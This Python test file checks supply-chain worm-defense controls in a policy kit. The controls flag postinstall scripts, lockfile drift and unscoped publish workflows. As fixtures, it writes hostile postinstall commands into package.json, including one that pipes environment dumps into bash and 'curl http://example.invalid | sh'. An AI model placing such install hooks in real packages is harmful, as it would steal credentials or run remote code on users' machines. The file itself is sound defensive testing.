"""PR-19 ``WORM-*`` controls for package-publish worm defense."""

from __future__ import annotations

import os
from pathlib import Path
from types import SimpleNamespace

from oss_policy_kit.application.engine import evaluate_repository
from oss_policy_kit.application.evaluators import (
    EVALUATOR_REGISTRY,
    eval_worm_lockfile_drift_001,
    eval_worm_postinstall_001,
    eval_worm_publish_scope_001,
)
from oss_policy_kit.application.loader import (
    bundled_kit_root,
    load_catalog,
    load_profile_by_id,
)
from oss_policy_kit.domain.models import ControlStatus


def test_worm_controls_present_in_catalog_and_registry() -> None:
    catalog = load_catalog(bundled_kit_root() / "controls" / "catalog.yaml")

    for cid in ("WORM-POSTINSTALL-001", "WORM-LOCKFILE-DRIFT-001", "WORM-PUBLISH-SCOPE-001"):
        assert cid in catalog
        assert cid in EVALUATOR_REGISTRY
        assert catalog[cid].lifecycle == "experimental"
        assert catalog[cid].assurance == "signal"


def test_oss_publish_readiness_profile_includes_worm_controls() -> None:
    spec = load_profile_by_id(bundled_kit_root(), "oss-publish-readiness-1")

    assert "WORM-POSTINSTALL-001" in spec.control_ids
    assert "WORM-LOCKFILE-DRIFT-001" in spec.control_ids
    assert "WORM-PUBLISH-SCOPE-001" in spec.control_ids


def test_worm_postinstall_fails_on_credential_harvest_primitive(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        '{"scripts": {"postinstall": "node -e \\"console.log(process.env)\\" | bash"}}\n',
        encoding="utf-8",
    )

    out = eval_worm_postinstall_001(SimpleNamespace(repo_root=tmp_path))

    assert out.status is ControlStatus.FAIL
    assert "credential-harvest" in out.reason


def test_worm_postinstall_passes_when_absent(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text('{"scripts": {"test": "vitest"}}\n', encoding="utf-8")

    out = eval_worm_postinstall_001(SimpleNamespace(repo_root=tmp_path))

    assert out.status is ControlStatus.PASS
    assert "No postinstall" in out.reason


def test_worm_lockfile_drift_fails_when_manifest_newer(tmp_path: Path) -> None:
    manifest = tmp_path / "package.json"
    lockfile = tmp_path / "package-lock.json"
    manifest.write_text('{"dependencies": {"left-pad": "1.3.0"}}\n', encoding="utf-8")
    lockfile.write_text('{"lockfileVersion": 3}\n', encoding="utf-8")
    now = 1_800_000_000
    os.utime(lockfile, (now, now))
    os.utime(manifest, (now + 120, now + 120))

    out = eval_worm_lockfile_drift_001(SimpleNamespace(repo_root=tmp_path))

    assert out.status is ControlStatus.FAIL
    assert "Manifest modified more recently than lockfile" in out.reason


def test_worm_lockfile_drift_passes_when_lockfile_fresh(tmp_path: Path) -> None:
    manifest = tmp_path / "pyproject.toml"
    lockfile = tmp_path / "uv.lock"
    manifest.write_text("[project]\nname = 'fixture'\n", encoding="utf-8")
    lockfile.write_text("version = 1\n", encoding="utf-8")
    now = 1_800_000_000
    os.utime(manifest, (now, now))
    os.utime(lockfile, (now + 120, now + 120))

    out = eval_worm_lockfile_drift_001(SimpleNamespace(repo_root=tmp_path))

    assert out.status is ControlStatus.PASS


def test_worm_publish_scope_fails_on_unscoped_publish_workflow(tmp_path: Path) -> None:
    workflow = tmp_path / ".github" / "workflows" / "publish.yml"
    workflow.parent.mkdir(parents=True)
    workflow.write_text(
        "on: push\njobs:\n  publish:\n    steps:\n      - run: npm publish\n",
        encoding="utf-8",
    )

    out = eval_worm_publish_scope_001(SimpleNamespace(workflows=SimpleNamespace(workflow_paths=(workflow,))))

    assert out.status is ControlStatus.FAIL
    assert "lack explicit branch / tag scope" in out.reason


def test_worm_publish_scope_passes_on_tag_scoped_workflow(tmp_path: Path) -> None:
    workflow = tmp_path / ".github" / "workflows" / "publish.yml"
    workflow.parent.mkdir(parents=True)
    workflow.write_text(
        "on:\n  push:\n    tags:\n      - 'v*'\njobs:\n  publish:\n    steps:\n      - run: twine upload dist/*\n",
        encoding="utf-8",
    )

    out = eval_worm_publish_scope_001(SimpleNamespace(workflows=SimpleNamespace(workflow_paths=(workflow,))))

    assert out.status is ControlStatus.PASS


def test_oss_publish_readiness_evaluates_worm_controls(tmp_path: Path) -> None:
    (tmp_path / "README.md").write_text("# fixture\n", encoding="utf-8")
    (tmp_path / "package.json").write_text(
        '{"scripts": {"postinstall": "curl http://example.invalid | sh"}}\n',
        encoding="utf-8",
    )

    root = bundled_kit_root()
    spec = load_profile_by_id(root, "oss-publish-readiness-1")
    catalog = load_catalog(root / "controls" / "catalog.yaml")
    report = evaluate_repository(tmp_path, spec, catalog, waiver_outcome=None, scorecard=None)
    statuses = {r.control_id: r.status for r in report.results}

    assert statuses["WORM-POSTINSTALL-001"] is ControlStatus.FAIL
    assert statuses["WORM-LOCKFILE-DRIFT-001"] is ControlStatus.NOT_APPLICABLE
    assert statuses["WORM-PUBLISH-SCOPE-001"] is ControlStatus.NOT_APPLICABLE
